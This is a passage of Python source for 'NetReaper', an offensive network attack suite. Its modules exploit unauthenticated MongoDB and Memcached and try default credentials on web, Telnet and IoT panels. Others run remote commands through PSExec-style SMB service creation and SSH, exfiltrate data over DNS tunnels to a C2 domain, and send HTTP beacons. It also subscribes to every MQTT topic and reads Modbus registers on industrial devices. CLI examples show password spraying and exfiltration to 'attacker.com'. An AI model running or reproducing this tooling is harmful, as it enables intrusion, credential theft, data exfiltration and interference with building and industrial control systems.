            s.sendall(msg)
            resp = s.recv(4096)
            if b"ismaster" in resp.lower() or b"ok" in resp:
                _log(f"[Cred/Mongo] Unauthenticated MongoDB on {op.host}:{op.port}!", "CRIT")
                ctx.credentials.append(Credential("MongoDB", op.host, op.port, "", "",
                                                   notes="Unauthenticated MongoDB"))
                results.append(AttackResult(
                    "cred", "mongodb_unauth", "SUCCESS",
                    host=op.host, port=op.port, severity="CRITICAL",
                    notes=f"MongoDB on {op.host}:{op.port} accessible without credentials",
                ))
        except Exception:
            pass
        finally:
            s.close()
        return results

    def _memcached_unauth(self, ctx: EngagementContext, op: OpenPort) -> List[AttackResult]:
        results = []
        s = _tcp_connect(op.host, op.port, ctx.timeout)
        if not s:
            return results
        try:
            s.sendall(b"stats\r\n")
            data = s.recv(4096).decode("utf-8", errors="replace")
            if "STAT pid" in data or "STAT version" in data:
                m = re.search(r"STAT version ([\d.]+)", data)
                ver = m.group(1) if m else "?"
                _log(f"[Cred/Memcached] Unauthenticated Memcached v{ver} on {op.host}:{op.port}!", "CRIT")
                results.append(AttackResult(
                    "cred", "memcached_unauth", "SUCCESS",
                    host=op.host, port=op.port, severity="CRITICAL",
                    data={"version": ver, "stats": data[:300]},
                    notes=f"Memcached {ver} unauthenticated — cache dump possible",
                ))
        except Exception:
            pass
        finally:
            s.close()
        return results

    def _http_default_creds(self, ctx: EngagementContext, op: OpenPort) -> List[AttackResult]:
        if not REQUESTS:
            return []
        results = []
        proto = "https" if op.port in (443, 8443) else "http"
        base = f"{proto}://{op.host}:{op.port}"

        for path in WEB_ADMIN_PATHS[:6]:
            url = base + path
            try:
                resp = _req_lib.get(url, timeout=ctx.timeout, verify=False,
                                    allow_redirects=False)
                if resp.status_code in (200, 401):
                    for user, passwd in IOT_DEFAULT_CREDS["HTTP"][:6]:
                        r = _req_lib.get(url, auth=(user, passwd),
                                         timeout=ctx.timeout, verify=False)
                        if r.status_code == 200 and r.status_code != resp.status_code:
                            _log(f"[Cred/HTTP] Default creds work! {url} {user}:{passwd}", "CRIT")
                            ctx.credentials.append(
                                Credential("HTTP", op.host, op.port, user, passwd,
                                           notes=f"Default creds on {url}"))
                            results.append(AttackResult(
                                "cred", "http_default_creds", "SUCCESS",
                                host=op.host, port=op.port, severity="CRITICAL",
                                data={"url": url, "user": user, "pass": passwd},
                                notes=f"HTTP default creds {user}:{passwd} on {url}",
                            ))
                            break
            except Exception:
                pass
        return results


# ── Module 4: Lateral Movement ─────────────────────────────────────────────────

class LateralModule:
    """Execute commands on remote hosts via WMI, SMB exec, and psexec-style techniques."""

    def run(self, ctx: EngagementContext, command: str = "whoami",
            domain: str = "") -> List[AttackResult]:
        results: List[AttackResult] = []
        if not ctx.credentials:
            _log("[Lateral] No credentials available — run cred module first", "WARN")
            return [AttackResult("lateral", "exec", "PARTIAL",
                                 notes="Need credentials from cred module first")]

        for cred in ctx.credentials:
            if cred.service in ("SMB", "SSH"):
                results.extend(self._exec_smb(ctx, cred, command, domain))
                results.extend(self._exec_ssh(ctx, cred, command))
        return results

    def _exec_smb(self, ctx: EngagementContext, cred: Credential,
                  command: str, domain: str) -> List[AttackResult]:
        if not IMPACKET:
            return []
        results = []
        try:
            from impacket.dcerpc.v5 import scmr
            from impacket.smbconnection import SMBConnection
            from impacket.dcerpc.v5.transport import DCERPCTransportFactory

            conn = SMBConnection(cred.host, cred.host, timeout=int(ctx.timeout))
            conn.login(cred.username, cred.password, domain)

            # PSExec-style: create remote service
            service_name = f"nr-{cred.host.replace('.','')[:8]}"
            rpctransport = transport.SMBTransport(cred.host, cred.port or 445,
                                                  filename=r"\svcctl",
                                                  smb_connection=conn)
            dce = rpctransport.get_dce_rpc()
            dce.connect()
            dce.bind(scmr.MSRPC_UUID_SCMR)

            hScManager = scmr.hROpenSCManagerW(dce)["lpScHandle"]
            output_file = f"\\Windows\\Temp\\{service_name}.txt"
            cmd_line = f"cmd.exe /c {command} > {output_file} 2>&1"
            try:
                hService = scmr.hRCreateServiceW(
                    dce, hScManager, service_name, service_name,
                    lpBinaryPathName=cmd_line
                )["lpServiceHandle"]
                scmr.hRStartServiceW(dce, hService)
                time.sleep(2)
                scmr.hRDeleteService(dce, hService)
                scmr.hRCloseServiceHandle(dce, hService)
            except Exception:
                pass

            # Read output
            try:
                output = conn.getFile("C$", output_file.replace("\\Windows\\Temp\\","Windows\\Temp\\"),
                                      lambda data: data)
                _log(f"[Lateral/SMB] Command output on {cred.host}: {output[:100]}", "CRIT")
                results.append(AttackResult(
                    "lateral", "smb_exec", "SUCCESS",
                    host=cred.host, severity="CRITICAL",
                    data={"command": command, "output": output[:500]},
                    notes=f"Remote command execution via SMB on {cred.host} as {cred.username}",
                ))
            except Exception:
                results.append(AttackResult(
                    "lateral", "smb_exec", "PARTIAL",
                    host=cred.host,
                    notes=f"Command executed but output file not readable from {output_file}",
                ))
            dce.disconnect()
            conn.close()
        except Exception as exc:
            results.append(AttackResult("lateral", "smb_exec", "FAILED",
                                        host=cred.host, notes=str(exc)))
        return results

    def _exec_ssh(self, ctx: EngagementContext, cred: Credential,
                  command: str) -> List[AttackResult]:
        if not PARAMIKO or cred.service != "SSH":
            return []
        results = []
        try:
            client = paramiko.SSHClient()
            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            client.connect(cred.host, port=cred.port or 22,
                           username=cred.username, password=cred.password,
                           timeout=ctx.timeout)
            stdin, stdout, stderr = client.exec_command(command, timeout=ctx.timeout)
            output = stdout.read().decode("utf-8", errors="replace")
            err = stderr.read().decode("utf-8", errors="replace")
            _log(f"[Lateral/SSH] {cred.host}: {output[:80]}", "CRIT")
            results.append(AttackResult(
                "lateral", "ssh_exec", "SUCCESS",
                host=cred.host, severity="CRITICAL",
                data={"command": command, "stdout": output[:500], "stderr": err[:100]},
                notes=f"SSH command execution on {cred.host} as {cred.username}",
            ))
            client.close()
        except Exception as exc:
            results.append(AttackResult("lateral", "ssh_exec", "FAILED",
                                        host=cred.host, notes=str(exc)))
        return results


# ── Module 5: C2 Tunneling ────────────────────────────────────────────────────

class TunnelModule:
    """DNS exfiltration and HTTP beacon tunneling for C2 or data exfiltration."""

    def run(self, ctx: EngagementContext, c2_domain: str = "",
            data_to_exfil: str = "") -> List[AttackResult]:
        results: List[AttackResult] = []
        if c2_domain:
            results.extend(self._dns_tunnel_exfil(ctx, c2_domain, data_to_exfil or "NETREAPER_TEST"))
        results.extend(self._http_beacon(ctx))
        return results

    def _dns_tunnel_exfil(self, ctx: EngagementContext,
                           c2_domain: str, data: str) -> List[AttackResult]:
        results = []
        encoded = base64.b32encode(data.encode()).decode().rstrip("=").lower()
        chunks = [encoded[i:i+C2_DNS_CHUNK_SIZE] for i in range(0, len(encoded), C2_DNS_CHUNK_SIZE)]
        _log(f"[Tunnel/DNS] Exfiltrating {len(data)} bytes via DNS ({len(chunks)} queries) to {c2_domain}", "INFO")

        sent_queries = []
        for i, chunk in enumerate(chunks):
            query = f"{chunk}.{i:04d}.{c2_domain}"
            try:
                socket.getaddrinfo(query, None)
                sent_queries.append(query)
            except socket.gaierror:
                sent_queries.append(query)  # Expected NXDOMAIN — still registers on C2
            _sleep(ctx)

        results.append(AttackResult(
            "tunnel", "dns_exfil", "SUCCESS" if sent_queries else "FAILED",
            severity="HIGH",
            data={"c2_domain": c2_domain, "queries_sent": len(sent_queries),
                  "sample": sent_queries[0] if sent_queries else ""},
            notes=f"DNS exfil: {len(sent_queries)} queries sent to {c2_domain}. "
                  f"Data will appear in DNS logs as queries: <b32data>.<seq>.{c2_domain}",
        ))
        return results

    def _http_beacon(self, ctx: EngagementContext) -> List[AttackResult]:
        # Demonstrate HTTP C2 beacon pattern using detected open HTTP ports
        http_ports = [op for op in ctx.open_ports if op.service in ("HTTP", "HTTP-Alt", "HTTPS")]
        if not http_ports or not REQUESTS:
            return []
        results = []
        # Covert beacon in User-Agent / X-Forwarded-For header
        beacon_data = {
            "hostname": socket.gethostname(),
            "timestamp": datetime.now(timezone.utc).isoformat(),
            "targets": [op.host for op in ctx.open_ports[:5]],
            "credentials": len(ctx.credentials),
        }
        beacon_b64 = base64.b64encode(json.dumps(beacon_data).encode()).decode()
        try:
            op = http_ports[0]
            proto = "https" if op.port in (443, 8443) else "http"
            _req_lib.get(
                f"{proto}://{op.host}:{op.port}/",
                headers={"User-Agent": f"Mozilla/5.0 ({beacon_b64[:30]})"},
                timeout=ctx.timeout, verify=False,
            )
            results.append(AttackResult(
                "tunnel", "http_beacon", "SUCCESS",
                host=op.host, severity="INFO",
                data={"beacon_payload": beacon_data, "encoded": beacon_b64[:40] + "..."},
                notes=f"HTTP beacon sent to {op.host}:{op.port} via User-Agent header",
            ))
        except Exception:
            pass
        return results


# ── Module 6: IoT / OT Attacks ───────────────────────────────────────────────

class IoTModule:
    """Default credentials, MQTT subscribe/publish, Modbus enumeration."""

    def run(self, ctx: EngagementContext) -> List[AttackResult]:
        results: List[AttackResult] = []
        for op in ctx.open_ports:
            if op.port == 1883 or op.port == 8883:
                results.extend(self._mqtt_attack(ctx, op))
            elif op.port == 502:
                results.extend(self._modbus_enum(ctx, op))
            elif op.port == 47808:
                results.extend(self._bacnet_enum(ctx, op))
            elif op.port in (80, 8080, 443, 8443):
                results.extend(self._iot_web_creds(ctx, op))
            elif op.port == 23:
                results.extend(self._telnet_default(ctx, op))
        return results

    def _mqtt_attack(self, ctx: EngagementContext, op: OpenPort) -> List[AttackResult]:
        if not PAHO_MQTT:
            return [AttackResult("iot", "mqtt", "PARTIAL", host=op.host, port=op.port,
                                 notes="Install paho-mqtt for MQTT attacks")]
        results = []
        collected_msgs: List[Dict[str, Any]] = []
        connected = threading.Event()
        lock = threading.Lock()

        def on_connect(client: Any, userdata: Any, flags: Any, rc: int) -> None:
            if rc == 0:
                connected.set()
                client.subscribe("#")  # Subscribe to ALL topics
                _log(f"[IoT/MQTT] Connected to {op.host}:{op.port} — subscribing to #", "CRIT")
            else:
                connected.set()  # Signal even on failure

        def on_message(client: Any, userdata: Any, msg: Any) -> None:
            with lock:
                collected_msgs.append({
                    "topic": msg.topic,
                    "payload": msg.payload.decode("utf-8", errors="replace")[:200],
                    "qos": msg.qos,
                })

        for user, passwd in [("",""),("guest","guest"),("admin","admin"),("mqtt","mqtt")]:
            try:
                client = mqtt_client.Client()
                client.on_connect = on_connect
                client.on_message = on_message
                if user:
                    client.username_pw_set(user, passwd)
                client.connect(op.host, op.port, keepalive=10)
                client.loop_start()
                connected.wait(timeout=ctx.timeout)
                if connected.is_set() and client.is_connected():
                    time.sleep(3)  # Collect messages for 3 seconds
                    client.loop_stop()
                    client.disconnect()
                    ctx.credentials.append(Credential(
                        "MQTT", op.host, op.port, user, passwd,
                        notes=f"MQTT broker accessible. Subscribed to # — captured {len(collected_msgs)} messages"
                    ))
                    ctx.loot.setdefault("mqtt", {})[op.host] = {
                        "credentials": (user, passwd),
                        "messages": collected_msgs[:20],
                    }
                    results.append(AttackResult(
                        "iot", "mqtt_subscribe", "SUCCESS",
                        host=op.host, port=op.port, severity="HIGH",
                        data={"user": user, "pass": passwd,
                              "messages_captured": len(collected_msgs),
                              "topics": list({m["topic"] for m in collected_msgs})[:10]},
                        notes=f"MQTT '{op.host}:{op.port}' open. Subscribed to all topics. "
                              f"{len(collected_msgs)} messages captured.",
                    ))
                    break
            except Exception:
                pass
        if not results:
            results.append(AttackResult("iot", "mqtt_attack", "FAILED",
                                        host=op.host, port=op.port,
                                        notes="All MQTT credential attempts failed"))
        return results

    def _modbus_enum(self, ctx: EngagementContext, op: OpenPort) -> List[AttackResult]:
        # Modbus/TCP has no authentication — read holding registers
        results = []
        try:
            s = _tcp_connect(op.host, op.port, ctx.timeout)
            if not s:
                return results
            # Modbus Read Holding Registers: Function Code 0x03
            # Transaction ID=1, Protocol=0, Length=6, Unit=1, FC=3, Start=0, Count=10
            request = b"\x00\x01\x00\x00\x00\x06\x01\x03\x00\x00\x00\x0a"
            s.sendall(request)
            s.settimeout(ctx.timeout)
            resp = s.recv(256)
            s.close()
            if len(resp) > 8 and resp[7] == 0x03:
                byte_count = resp[8]
                registers = []
                for i in range(0, byte_count, 2):
                    if 9 + i + 1 < len(resp):
                        reg = struct.unpack(">H", resp[9+i:9+i+2])[0]
                        registers.append(reg)
                _log(f"[IoT/Modbus] Unauthenticated Modbus on {op.host}:{op.port}! Registers: {registers}", "CRIT")
                results.append(AttackResult(
                    "iot", "modbus_read", "SUCCESS",
                    host=op.host, port=op.port, severity="HIGH",
                    data={"registers": registers},
                    notes=f"Modbus/TCP with no auth on {op.host}:{op.port}. Holding registers readable.",
                ))
            else:
                results.append(AttackResult("iot", "modbus_probe", "PARTIAL",
                                            host=op.host, port=op.port,
                                            notes="Modbus responded but register read returned unexpected response"))
        except Exception as exc:
            results.append(AttackResult("iot", "modbus_read", "FAILED",
                                        host=op.host, port=op.port, notes=str(exc)))
        return results

    def _bacnet_enum(self, ctx: EngagementContext, op: OpenPort) -> List[AttackResult]:
        results = []
        try:
            # BACnet Who-Is broadcast (UDP)
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.settimeout(ctx.timeout)
            # BACnet Who-Is APDU
            bacnet_whois = bytes.fromhex("810b000c0120ffff00ff1008")
            s.sendto(bacnet_whois, (op.host, 47808))
            resp, addr = s.recvfrom(1024)
            s.close()
            if resp:
                _log(f"[IoT/BACnet] BACnet device responded on {op.host}:47808!", "CRIT")
                results.append(AttackResult(
                    "iot", "bacnet_discovery", "SUCCESS",
                    host=op.host, port=47808, severity="MEDIUM",
                    data={"raw_response": resp.hex()},
                    notes=f"BACnet/IP device at {op.host}:47808 — building automation system accessible",
                ))
        except Exception:
            pass
        return results

    def _iot_web_creds(self, ctx: EngagementContext, op: OpenPort) -> List[AttackResult]:
        if not REQUESTS:
            return []
        results = []
        proto = "https" if op.port in (443, 8443) else "http"
        base = f"{proto}://{op.host}:{op.port}"
        # IoT admin panel paths
        iot_paths = ["/", "/admin", "/cgi-bin/luci", "/webman/", "/ui/",
                     "/HNAP1/", "/eng/", "/sys.html", "/setup.cgi"]
        for path in iot_paths[:4]:
            url = base + path
            try:
                resp = _req_lib.get(url, timeout=ctx.timeout, verify=False, allow_redirects=False)
                if resp.status_code == 200 and any(
                    kw in resp.text.lower() for kw in
                    ["router", "gateway", "camera", "dvr", "nvr", "plc", "scada",
                     "tp-link", "d-link", "netgear", "hikvision", "dahua", "axis"]
                ):
                    for user, passwd in IOT_DEFAULT_CREDS["HTTP"]:
                        r = _req_lib.get(url, auth=(user, passwd), timeout=ctx.timeout, verify=False)
                        if r.status_code == 200 and "login" not in r.url.lower():
                            _log(f"[IoT/Web] Default creds on IoT device {url} ({user}:{passwd})", "CRIT")
                            ctx.credentials.append(
                                Credential("IoT-HTTP", op.host, op.port, user, passwd,
                                           notes=f"IoT device default creds on {url}"))
                            results.append(AttackResult(
                                "iot", "iot_default_creds", "SUCCESS",
                                host=op.host, port=op.port, severity="CRITICAL",
                                data={"url": url, "user": user, "pass": passwd},
                                notes=f"IoT device admin panel unlocked: {url} | {user}:{passwd}",
                            ))
                            break
            except Exception:
                pass
        return results

    def _telnet_default(self, ctx: EngagementContext, op: OpenPort) -> List[AttackResult]:
        results = []
        try:
            s = _tcp_connect(op.host, op.port, ctx.timeout)
            if not s:
                return results
            s.settimeout(ctx.timeout)
            banner = s.recv(1024).decode("utf-8", errors="replace")
            for user, passwd in IOT_DEFAULT_CREDS["Telnet"]:
                try:
                    if "login" in banner.lower() or "username" in banner.lower():
                        s.sendall((user + "\n").encode())
                        time.sleep(0.5)
                        resp = s.recv(1024).decode("utf-8", errors="replace")
                        if "password" in resp.lower():
                            s.sendall((passwd + "\n").encode())
                            time.sleep(0.5)
                            resp2 = s.recv(1024).decode("utf-8", errors="replace")
                            if any(ind in resp2.lower() for ind in ["#","$",">","welcome","last login"]):
                                _log(f"[IoT/Telnet] Default creds work on {op.host}:{op.port} ({user}:{passwd})", "CRIT")
                                ctx.credentials.append(
                                    Credential("Telnet", op.host, op.port, user, passwd))
                                results.append(AttackResult(
                                    "iot", "telnet_default", "SUCCESS",
                                    host=op.host, port=op.port, severity="CRITICAL",
                                    data={"user": user, "pass": passwd, "banner": banner[:100]},
                                    notes=f"Telnet default creds: {user}:{passwd} on {op.host}",
                                ))
                                break
                except Exception:
                    pass
            s.close()
        except Exception:
            pass
        return results


# ── Output ─────────────────────────────────────────────────────────────────────

def print_banner() -> None:
    if PYFIGLET:
        import pyfiglet as pf
        print(f"\033[35m{pf.figlet_format('NetReaper', font='slant')}\033[0m")
    else:
        print(f"\033[35m\n  {TOOL_NAME} v{VERSION}\n\033[0m")
    print(f"\033[36m  Author: {AUTHOR}  |  Offensive Network Attack Suite\033[0m\n")

def print_legal(yes: bool) -> bool:
    print(f"\033[33m{LEGAL_WARNING}\033[0m")
    if yes:
        return True
    try:
        ans = input("  Type 'yes' to confirm written authorization: ").strip().lower()
        return ans == "yes"
    except (KeyboardInterrupt, EOFError):
        return False

def dump_results(ctx: EngagementContext, output: Optional[str]) -> None:
    print(f"\n\033[35m{'═'*60}\n  ENGAGEMENT RESULTS\n{'═'*60}\033[0m")
    success = [r for r in ctx.results if r.status == "SUCCESS"]
    crits   = [r for r in ctx.results if r.severity == "CRITICAL"]
    print(f"  Open Ports   : {len(ctx.open_ports)}")
    print(f"  Successes    : \033[32m{len(success)}\033[0m")
    print(f"  Critical     : \033[35m{len(crits)}\033[0m")
    print(f"  Credentials  : \033[33m{len(ctx.credentials)}\033[0m\n")

    for r in ctx.results:
        icons = {"SUCCESS":"\033[32m[+]","FAILED":"\033[31m[x]",
                 "PARTIAL":"\033[33m[~]","INFO":"\033[36m[*]"}
        c = icons.get(r.status, "   ")
        reset = "\033[0m"
        host_str = f"{r.host}:{r.port}" if r.host else ""
        print(f"  {c}{reset} [{r.module}] {r.action} {host_str}")
        if r.notes:
            print(f"        {r.notes}")

    if ctx.credentials:
        print(f"\n\033[32m[+] CREDENTIALS ({len(ctx.credentials)})\033[0m")
        for c in ctx.credentials:
            print(f"  [{c.service}] {c.host}:{c.port} — {c.username}:{c.password or c.hash_val}")
            if c.notes: print(f"         {c.notes}")

    if ctx.open_ports:
        print(f"\n\033[36m[*] OPEN PORTS ({len(ctx.open_ports)})\033[0m")
        for op in ctx.open_ports:
            ver_str = f" [{op.version}]" if op.version else ""
            print(f"  {op.host}:{op.port}\t{op.service}{ver_str}")
            if op.banner and op.banner[:60]:
                print(f"          Banner: {op.banner[:60]}")

    if output:
        payload = {
            "tool": TOOL_NAME, "version": VERSION,
            "open_ports": [{"host":p.host,"port":p.port,"service":p.service,"banner":p.banner[:100]}
                           for p in ctx.open_ports],
            "credentials": [{"service":c.service,"host":c.host,"port":c.port,
                              "username":c.username,"password":c.password,"notes":c.notes}
                             for c in ctx.credentials],
            "results": [{"module":r.module,"action":r.action,"status":r.status,
                         "host":r.host,"port":r.port,"severity":r.severity,"notes":r.notes}
                        for r in ctx.results],
            "loot": ctx.loot,
        }
        Path(output).write_text(json.dumps(payload, indent=2, default=str), encoding="utf-8")
        print(f"\n\033[32m[+] Results saved → {output}\033[0m")


# ── CLI ────────────────────────────────────────────────────────────────────────

def build_parser() -> argparse.ArgumentParser:
    p = argparse.ArgumentParser(
        prog=COMMAND,
        description=f"{TOOL_NAME} v{VERSION}",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=textwrap.dedent(f"""
        Examples:
          # Port scan a subnet
          python {COMMAND}.py --targets 192.168.1.0/24 --modules scan

          # Enumerate SMB, LDAP, DNS
          python {COMMAND}.py --targets 10.0.0.5 --modules enum --domain corp.local

          # Credential attacks (default creds, anonymous auth)
          python {COMMAND}.py --targets 10.0.0.0/24 --modules cred --ports 22 445 21 6379

          # Password spray over SMB
          python {COMMAND}.py --targets 10.0.0.5 --modules cred --spray-pass "Spring2024!"

          # Execute command on compromised hosts
          python {COMMAND}.py --targets 10.0.0.5 --modules lateral --command "whoami /all"

          # DNS exfiltration via C2 domain
          python {COMMAND}.py --targets 10.0.0.5 --modules tunnel --c2-domain attacker.com

          # IoT/OT attack
          python {COMMAND}.py --targets 192.168.0.0/24 --modules iot --ports 1883 502 23 80

          # Full offensive chain
          python {COMMAND}.py --targets 10.0.0.0/24 --modules all --output loot.json
        """),
    )
    p.add_argument("--targets",  nargs="+", required=True,
                   help="IP addresses, hostnames, or CIDR ranges")
    p.add_argument("--modules",  nargs="+",
                   choices=["scan","enum","cred","lateral","tunnel","iot","all"],
                   default=["scan"])
    p.add_argument("--ports",    nargs="+", type=int,
                   help="Ports to scan (default: top 50 ports)")
    p.add_argument("--domain",   default="", help="Target domain for LDAP/DNS enumeration")
    p.add_argument("--command",  default="whoami", help="Command to execute (lateral module)")
    p.add_argument("--spray-pass",default="",help="Password to spray across all discovered usernames")
    p.add_argument("--userlist", help="File with usernames (one per line)")
    p.add_argument("--passlist", help="File with passwords (one per line)")
    p.add_argument("--c2-domain",default="",help="C2 domain for DNS tunneling")
    p.add_argument("--exfil-data",default="",help="Data to exfiltrate via DNS tunnel")
    p.add_argument("--threads",  type=int, default=50, help="Scan threads (default: 50)")
    p.add_argument("--timeout",  type=float, default=2.0)
    p.add_argument("--delay",    type=float, default=0.1, help="Delay between requests (stealth)")
    p.add_argument("--stealth",  action="store_true", help="Rate-limit requests")
    p.add_argument("--output","-o", help="Save results to JSON file")
    p.add_argument("--yes","-y", action="store_true")
    p.add_argument("--verbose","-v",action="store_true")
    p.add_argument("--version",  action="version", version=f"{TOOL_NAME} v{VERSION}")
    return p


def main() -> int:
    parser = build_parser()
    args   = parser.parse_args()

    print_banner()
    if not print_legal(args.yes):
        print("Aborted.")
        return 1

    ports = args.ports or TOP_PORTS

    userlist: Optional[List[str]] = None
    passlist: Optional[List[str]] = None
    if args.userlist:
        try:
            userlist = Path(args.userlist).read_text().splitlines()
        except Exception:
            pass
    if args.passlist:
        try:
            passlist = Path(args.passlist).read_text().splitlines()
        except Exception:
            pass

    ctx = EngagementContext(
        targets=args.targets,
        ports=ports,
        threads=args.threads,
        timeout=args.timeout,
        delay=args.delay,
        stealth=args.stealth,
    )

    run_all = "all" in args.modules
    modules_to_run = ["scan","enum","cred","lateral","tunnel","iot"] if run_all else args.modules

    module_map = {
        "scan":    ScanModule(),
        "enum":    EnumModule(),
        "cred":    CredAttackModule(),
        "lateral": LateralModule(),
        "tunnel":  TunnelModule(),
        "iot":     IoTModule(),
    }

    for mod_name in modules_to_run:
        mod = module_map.get(mod_name)
        if not mod:
            continue
        _log(f"Running module: {mod_name.upper()}", "INFO")
        try:
            if mod_name == "enum":
                results = mod.run(ctx, domain=args.domain)
            elif mod_name == "cred":
                results = mod.run(ctx, username_list=userlist, password_list=passlist,
                                  spray_password=args.spray_pass)
            elif mod_name == "lateral":
                results = mod.run(ctx, command=args.command, domain=args.domain)
            elif mod_name == "tunnel":
                results = mod.run(ctx, c2_domain=args.c2_domain, data_to_exfil=args.exfil_data)
            else:
                results = mod.run(ctx)
            ctx.results.extend(results)
        except Exception as exc:
            _log(f"Module {mod_name} error: {exc}", "ERR")

    dump_results(ctx, args.output)
    return 0


if __name__ == "__main__":
    sys.exit(main())

